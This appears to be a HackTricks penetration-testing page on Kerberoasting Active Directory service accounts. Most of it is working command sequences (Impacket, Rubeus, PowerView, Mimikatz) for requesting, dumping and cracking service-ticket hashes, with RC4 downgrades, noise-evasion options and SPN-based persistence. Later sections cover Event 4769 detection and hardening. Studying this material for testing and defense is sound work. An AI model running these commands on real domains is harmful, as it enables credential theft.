# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting focuses on the acquisition of TGS tickets, specifically those related to services operating under user accounts in Active Directory (AD), excluding computer accounts. The encryption of these tickets utilizes keys that originate from user passwords, allowing for offline credential cracking. The use of a user account as a service is indicated by a non-empty ServicePrincipalName (SPN) property.

Any authenticated domain user can request TGS tickets, so no special privileges are needed.

### Key Points

- Targets TGS tickets for services that run under user accounts (i.e., accounts with SPN set; not computer accounts).
- Tickets are encrypted with a key derived from the service account’s password and can be cracked offline.
- No elevated privileges required; any authenticated account can request TGS tickets.

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### Attack

#### Linux

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Multi-feature tools including kerberoast checks:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Enumerate kerberoastable users

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: Ask for TGS and dump from memory

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2: Automatic tools

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> A TGS request generates Windows Security Event 4769 (A Kerberos service ticket was requested).

### OPSEC and AES-only environments

- Request RC4 on purpose for accounts without AES:
  - Rubeus: `/rc4opsec` uses tgtdeleg to enumerate accounts without AES and requests RC4 service tickets.
  - Rubeus: `/tgtdeleg` with kerberoast also triggers RC4 requests where possible.
- Roast AES-only accounts instead of failing silently:
  - Rubeus: `/aes` enumerates accounts with AES enabled and requests AES service tickets (etype 17/18).
  - If you already hold a TGT (PTT or from a .kirbi), you can use `/ticket:<blob|path>` with `/spn:<SPN>` or `/spns:<file>` and skip LDAP.
- Targeting, throttling and less noise:
  - Use `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` and `/jitter:<1-100>`.
  - Filter for likely weak passwords using `/pwdsetbefore:<MM-dd-yyyy>` (older passwords) or target privileged OUs with `/ou:<DN>`.

Examples (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Persistence / Abuse

If you control or can modify an account, you can make it kerberoastable by adding an SPN:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Downgrade an account to enable RC4 for easier cracking (requires write privileges on the target object):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Detection

Kerberoasting can be stealthy. Hunt for Event ID 4769 from DCs and apply filters to reduce noise:

- Exclude service name `krbtgt` and service names ending with `$` (computer accounts).
- Exclude requests from machine accounts (`*$$@*`).
- Only successful requests (Failure Code `0x0`).
- Track encryption types: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Don’t alert only on `0x17`.

Example PowerShell triage:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Additional ideas:

- Baseline normal SPN usage per host/user; alert on large bursts of distinct SPN requests from a single principal.
- Flag unusual RC4 usage in AES-hardened domains.

### Mitigation / Hardening

- Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical.
- Enforce AES on service accounts by setting `msDS-SupportedEncryptionTypes` to AES-only (decimal 24 / hex 0x18) and then rotating the password so AES keys are derived.
- Where possible, disable RC4 in your environment and monitor for attempted RC4 usage. On DCs you can use the `DefaultDomainSupportedEncTypes` registry value to steer defaults for accounts without `msDS-SupportedEncryptionTypes` set. Test thoroughly.
- Remove unnecessary SPNs from user accounts.
- Use long, random service account passwords (25+ chars) if managed accounts are not feasible; ban common passwords and audit regularly.

### Kerberoast without a domain account (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> You must provide a list of users because without valid credentials you cannot query LDAP with this technique.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Related

If you are targeting AS-REP roastable users, see also:


{{#ref}}
asreproast.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting documentation: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
